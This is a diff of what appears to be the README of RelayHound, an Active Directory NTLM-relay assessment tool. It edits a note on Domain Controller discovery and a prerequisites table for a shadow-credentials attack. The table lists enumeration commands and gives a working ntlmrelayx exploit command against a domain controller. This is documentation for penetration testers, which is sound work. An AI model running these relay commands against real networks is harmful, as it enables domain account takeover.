@@ -175,7 +175,7 @@ Options:
 
 ## DC Discovery
 
-RelayHound automatically discovers Domain Controllers beyond the `--dc-ip` you specify, including DCs in child domains and other forest partitions. Discovered DCs are shown in the run config panel and check results, and are used throughout all checks to ensure targets are correctly identified as DCs, member servers, or workstations. Recommended attack paths use this to rank attacks against DCs as higher impact than the same attack against a member server or workstation. For most single-forest and parent/child domain topologies this requires no extra flags. `--dc-ips` is still available for edge cases where automatic discovery cannot reach a DC, such as a forest with no DNS connectivity from the attacker machine.
+RelayHound automatically discovers Domain Controllers beyond the `--dc-ip` you specify, including DCs in child domains and other forest partitions. Discovered DCs are shown in the run config panel and check results, and are used throughout all checks to ensure targets are correctly identified as DCs, member servers, or workstations. Recommended attack paths use this to rank attacks against DCs as higher impact than the same attack against a member server or workstation. For most single-forest and parent/child domain topologies this requires no extra flags. `--dc-ips` is still available for edge cases where automatic discovery cannot reach a DC.
 
 ---
 
@@ -223,8 +223,10 @@ Relay NTLM to LDAP to write `msDS-KeyCredentialLink` on a target computer object
 | LDAP signing not enforced | ✅ | `nxc ldap --module ldap-checker` |
 | LDAP channel binding not required | ✅ | `nxc ldap --module ldap-checker` |
 | Writable computer object exists | ✅ | `bloodyAD get writable --otype COMPUTER` |
-| Domain functional level ≥ 2016 | ⚠️ Optional | ldap3 `msDS-Behavior-Version` |
-| ADCS or local KDC supports PKINIT | ⚠️ Optional | certipy check |
+| Domain functional level ≥ 2016 | ✅ | ldap3 `msDS-Behavior-Version` |
+| DC has KDC certificate for PKINIT | ✅ | `certipy-ad find -stdout` |
+| ADCS present for UnPAC-the-hash | ⚠️ Optional | `nxc ldap --module adcs` / certipy |
+| WebClient running on target | ⚠️ Optional | `nxc smb --module webdav` |
 
 **Exploit:** `ntlmrelayx.py -t ldaps://<dc> --shadow-credentials --shadow-target <computer>`
 
